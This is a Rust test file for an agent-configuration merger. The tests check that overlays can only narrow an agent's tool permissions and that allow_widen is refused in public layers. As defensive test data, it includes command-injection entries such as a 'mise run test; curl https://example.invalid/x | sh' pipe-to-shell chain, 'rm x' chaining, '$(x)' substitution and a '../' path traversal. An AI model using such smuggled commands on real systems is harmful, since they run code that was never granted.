//! The narrowing rule of spec §7.2 through the merge: what an overlay may do to an agent's tools,
//! and what `allow_widen` changes.

use proptest::prelude::{Strategy, prop_assert, prop_assert_eq, proptest};

use crate::item::{AgentName, ToolGrant};
use crate::merge::testing::{layer, layer_visible, lines, merged};
use crate::merge::{MergedAgent, Merging, covers};
use crate::stack::ResolvedLayer;

// The files of acceptance case 04 (§13.4), read from the fixtures themselves.
const BASE_04: &str =
    include_str!("../../../../../test/fixtures/04-tool-narrowing/personal/agents/builder.md");
const WIDEN_04: &str = include_str!(
    "../../../../../test/fixtures/04-tool-narrowing/repo-widen/.layer/agents/builder.overlay.md"
);
const NARROW_04: &str = include_str!(
    "../../../../../test/fixtures/04-tool-narrowing/repo-narrow/.layer/agents/builder.overlay.md"
);

const WIDEN_MESSAGE_TAIL: &str = ", which the agent it refines does not grant; an overlay may only remove or narrow tools (allow_widen: true is accepted in a layer that is not public)";

/// A stack of a base agent in `personal`, an overlay in `acme` and, when given, one in `shop-api`.
fn stack(base: &str, overlays: &[&str]) -> Vec<ResolvedLayer> {
    [("acme", "client"), ("shop-api", "repo")]
        .iter()
        .zip(overlays)
        .map(|((name, kind), overlay)| layer(name, kind, &[("agents/a.overlay.md", overlay)]))
        .fold(
            vec![layer("personal", "personal", &[("agents/a.md", base)])],
            |layers, next| layers.into_iter().chain([next]).collect(),
        )
}

fn base(tools: &str) -> String {
    format!("---\nname: a\ndescription: Plans\ntools: {tools}\n---\nbase\n")
}

fn overlay(front: &str) -> String {
    format!("---\nextends: a\n{front}\n---\n")
}

fn tools_of(found: &Merging) -> Option<Vec<String>> {
    let name = AgentName::try_from("a").expect("an agent name");
    found
        .merged()
        .and_then(|model| model.agents().get(&name))
        .and_then(|agent| agent.value().tools())
        .map(|tools| tools.iter().map(ToString::to_string).collect())
}

fn entries(list: &[&str]) -> Vec<String> {
    list.iter().map(|entry| (*entry).to_owned()).collect()
}

fn widening(layer_file: &str, entry: &str) -> String {
    format!(
        "error [tool-widen] {layer_file}: overlay on agent a adds tool {entry}{WIDEN_MESSAGE_TAIL}"
    )
}

// Acceptance case 04, first case: "an overlay that adds a tool fails".
#[test]
fn an_overlay_that_adds_a_tool_fails_naming_the_agent_the_tool_and_the_layer() {
    let found = merged(vec![
        layer("personal", "personal", &[("agents/builder.md", BASE_04)]),
        layer(
            "shop-api",
            "repo",
            &[("agents/builder.overlay.md", WIDEN_04)],
        ),
    ]);
    assert_eq!(
        lines(&found),
        [format!(
            "error [tool-widen] shop-api:agents/builder.overlay.md: overlay on agent builder adds tool write{WIDEN_MESSAGE_TAIL}"
        )]
    );
    assert!(found.merged().is_none());
}

// Acceptance case 04, second case: "an overlay that removes a tool or narrows a scope passes".
#[test]
fn an_overlay_that_removes_a_tool_or_narrows_a_scope_passes() {
    let found = merged(vec![
        layer("personal", "personal", &[("agents/builder.md", BASE_04)]),
        layer(
            "shop-api",
            "repo",
            &[("agents/builder.overlay.md", NARROW_04)],
        ),
    ]);
    assert_eq!(lines(&found), Vec::<String>::new());
    let name = AgentName::try_from("builder").expect("an agent name");
    let agent: &MergedAgent = found
        .merged()
        .and_then(|model| model.agents().get(&name))
        .expect("the agent exists")
        .value();
    assert_eq!(
        agent
            .tools()
            .map(|tools| tools.iter().map(ToString::to_string).collect::<Vec<_>>()),
        Some(entries(&["read", "bash:mise run test"]))
    );
}

#[test]
fn an_overlay_may_remove_a_tool_and_add_it_back() {
    let found = merged(stack(
        &base("[read, edit]"),
        &[&overlay("tools: -[edit] +[edit]")],
    ));
    assert_eq!(lines(&found), Vec::<String>::new());
    assert_eq!(tools_of(&found), Some(entries(&["read", "edit"])));
}

#[test]
fn every_added_tool_that_no_base_entry_covers_is_one_error() {
    let found = merged(stack(
        &base("[read]"),
        &[&overlay("tools: +[write, \"bash:ls\", read]")],
    ));
    assert_eq!(
        lines(&found),
        [
            widening("acme:agents/a.overlay.md", "write"),
            widening("acme:agents/a.overlay.md", "bash:ls"),
        ]
    );
}

#[test]
fn a_refused_overlay_changes_nothing_of_the_agent() {
    let found = merged(stack(
        &base("[read]"),
        &[&overlay(
            "description: Other\nskills: +[extra]\ntools: +[write]",
        )],
    ));
    assert!(found.merged().is_none());
    assert_eq!(lines(&found).len(), 1);
}

#[test]
fn an_overlay_narrows_from_the_agent_as_the_earlier_overlays_left_it() {
    let narrowed = overlay("tools: -[\"write:docs/**\"] +[\"write:docs/adr/**\"]");
    let widened_again = overlay("tools: +[\"write:docs/**\"]");
    let found = merged(stack(
        &base("[read, \"write:docs/**\"]"),
        &[&narrowed, &widened_again],
    ));
    assert_eq!(
        lines(&found),
        [widening("shop-api:agents/a.overlay.md", "write:docs/**")]
    );
}

#[test]
fn an_overlay_may_give_an_agent_that_inherits_every_tool_a_list() {
    let found = merged(stack(
        "---\nname: a\ndescription: Plans\n---\n",
        &[&overlay("tools: [read, \"bash:ls\"]")],
    ));
    assert_eq!(lines(&found), Vec::<String>::new());
    assert_eq!(tools_of(&found), Some(entries(&["read", "bash:ls"])));
}

#[test]
fn a_replace_overlay_that_defines_an_agent_is_not_checked_against_a_base() {
    let found = merged(vec![layer(
        "acme",
        "client",
        &[(
            "agents/a.overlay.md",
            "---\nextends: a\nmode: replace\ndescription: d\ntools: [write]\n---\n",
        )],
    )]);
    assert_eq!(lines(&found), Vec::<String>::new());
    assert_eq!(tools_of(&found), Some(entries(&["write"])));
}

#[test]
fn an_unknown_tool_in_an_agent_file_is_an_agent_error() {
    let found = merged(stack(&base("[read, bogus]"), &[]));
    let reported = lines(&found);
    assert_eq!(reported.len(), 1);
    assert!(
        reported
            .first()
            .is_some_and(|line| line.starts_with("error [agent] personal:agents/a.md:")),
        "{reported:?}"
    );
}

// Reference drift (TASK-55.5.6): the reference reads any scope that ends in `*` as covering every
// scope that starts with its text before the stars.
#[test]
fn a_trailing_star_path_scope_does_not_cover_another_folder() {
    let found = merged(stack(
        &base("[\"write:docs*\"]"),
        &[&overlay("tools: +[\"write:docs-private/**\"]")],
    ));
    assert_eq!(
        lines(&found),
        [widening(
            "acme:agents/a.overlay.md",
            "write:docs-private/**"
        )]
    );
}

#[test]
fn a_command_scope_does_not_cover_a_chain_of_commands() {
    let found = merged(stack(
        &base("[\"bash:mise run *\"]"),
        &[&overlay(
            "tools: +[\"bash:mise run test; curl https://example.invalid/x | sh\"]",
        )],
    ));
    assert_eq!(
        lines(&found),
        [widening(
            "acme:agents/a.overlay.md",
            "bash:mise run test; curl https://example.invalid/x | sh"
        )]
    );
}

#[test]
fn allow_widen_in_a_layer_that_is_not_public_lets_an_overlay_add_a_tool() {
    let found = merged(stack(
        &base("[read]"),
        &[&overlay("allow_widen: true\ntools: +[write, \"bash:ls\"]")],
    ));
    assert_eq!(lines(&found), Vec::<String>::new());
    assert_eq!(
        tools_of(&found),
        Some(entries(&["read", "write", "bash:ls"]))
    );
}

#[test]
fn allow_widen_in_a_public_layer_is_an_error_even_when_the_overlay_adds_nothing() {
    let found = merged(vec![
        layer_visible(
            "personal",
            "personal",
            "public",
            &[("agents/a.md", &base("[read]"))],
        ),
        layer_visible(
            "acme",
            "client",
            "public",
            &[(
                "agents/a.overlay.md",
                &overlay("allow_widen: true\ntools: -[read]"),
            )],
        ),
    ]);
    assert_eq!(
        lines(&found),
        [
            "error [tool-widen] acme:agents/a.overlay.md: allow_widen is not allowed in a public layer"
        ]
    );
    assert!(found.merged().is_none());
}

#[test]
fn a_public_layer_may_narrow_without_allow_widen() {
    let found = merged(vec![
        layer_visible(
            "personal",
            "personal",
            "public",
            &[("agents/a.md", &base("[read, write]"))],
        ),
        layer_visible(
            "acme",
            "client",
            "public",
            &[("agents/a.overlay.md", &overlay("tools: -[write]"))],
        ),
    ]);
    assert_eq!(lines(&found), Vec::<String>::new());
    assert_eq!(tools_of(&found), Some(entries(&["read"])));
}

/// The entries the laws draw from: a few paths and commands that cover one another in every way
/// the rule tells apart.
const POOL: [&str; 14] = [
    "read",
    "write",
    "write:docs/**",
    "write:docs/adr/**",
    "write:docs/a.md",
    "write:docs-private/**",
    "write:docs*",
    "write:docs/../x",
    "bash",
    "bash:mise run *",
    "bash:mise run test",
    "bash:mise run test; rm x",
    "bash:mise run $(x)",
    "web_fetch:example.invalid",
];

fn pool_entries() -> impl Strategy<Value = Vec<&'static str>> {
    proptest::collection::vec(proptest::sample::select(POOL.to_vec()), 1..5)
}

fn written(entries: &[&str]) -> String {
    let quoted: Vec<String> = entries.iter().map(|entry| format!("\"{entry}\"")).collect();
    format!("[{}]", quoted.join(", "))
}

/// What the overlay's `-[remove] +[add]` leaves of `base`, written out independently of
/// `ListEdit`: the entries that are not removed, then the added ones, each once.
fn after(base: &[&'static str], remove: &[&str], add: &[&'static str]) -> Vec<&'static str> {
    base.iter()
        .copied()
        .filter(|entry| !remove.contains(entry))
        .chain(add.iter().copied())
        .fold(Vec::new(), |kept, entry| {
            if kept.contains(&entry) {
                kept
            } else {
                kept.into_iter().chain([entry]).collect()
            }
        })
}

fn grants(entries: &[&str]) -> Vec<ToolGrant> {
    entries
        .iter()
        .map(|entry| ToolGrant::try_from(*entry).expect("a tool entry"))
        .collect()
}

proptest! {
    #[test]
    fn without_allow_widen_in_a_private_layer_every_merged_grant_is_covered_by_a_base_grant(
        base_entries in pool_entries(),
        remove in pool_entries(),
        add in pool_entries(),
    ) {
        let front = format!(
            "tools: -{} +{}",
            written(&remove),
            written(&add)
        );
        let found = merged(stack(&base(&written(&base_entries)), &[&overlay(&front)]));
        let result = after(&base_entries, &remove, &add);
        let base_grants = grants(&base_entries);
        let all_covered = grants(&result)
            .iter()
            .all(|entry| base_grants.iter().any(|granted| covers(granted, entry)));
        // The merge accepts an overlay exactly when every entry it leaves is covered ...
        prop_assert_eq!(found.merged().is_some(), all_covered, "{:?}", lines(&found));
        // ... and what it accepts is covered by the base, entry by entry.
        if let Some(tools) = tools_of(&found) {
            prop_assert_eq!(&tools, &result);
            prop_assert!(grants(&tools.iter().map(String::as_str).collect::<Vec<_>>())
                .iter()
                .all(|entry| base_grants.iter().any(|granted| covers(granted, entry))));
        }
        // A refusal is a `tool-widen` error and nothing else.
        prop_assert!(found.diagnostics().iter().all(|problem| problem.to_string().starts_with("error [tool-widen]")));
    }

    #[test]
    fn with_allow_widen_in_a_private_layer_the_overlay_applies_as_written(
        base_entries in pool_entries(),
        remove in pool_entries(),
        add in pool_entries(),
    ) {
        let front = format!(
            "allow_widen: true\ntools: -{} +{}",
            written(&remove),
            written(&add)
        );
        let found = merged(stack(&base(&written(&base_entries)), &[&overlay(&front)]));
        prop_assert_eq!(lines(&found), Vec::<String>::new());
        prop_assert_eq!(tools_of(&found), Some(after(&base_entries, &remove, &add).into_iter().map(str::to_owned).collect()));
    }

    #[test]
    fn allow_widen_in_a_public_layer_is_always_refused(
        base_entries in pool_entries(),
        add in pool_entries(),
        edits_tools in proptest::bool::ANY,
    ) {
        let front = if edits_tools {
            format!("allow_widen: true\ntools: +{}", written(&add))
        } else {
            "allow_widen: true".to_owned()
        };
        let found = merged(vec![
            layer_visible("personal", "personal", "public", &[("agents/a.md", &base(&written(&base_entries)))]),
            layer_visible("acme", "client", "public", &[("agents/a.overlay.md", &overlay(&front))]),
        ]);
        prop_assert!(found.merged().is_none());
        prop_assert_eq!(
            lines(&found),
            ["error [tool-widen] acme:agents/a.overlay.md: allow_widen is not allowed in a public layer"]
        );
    }
}
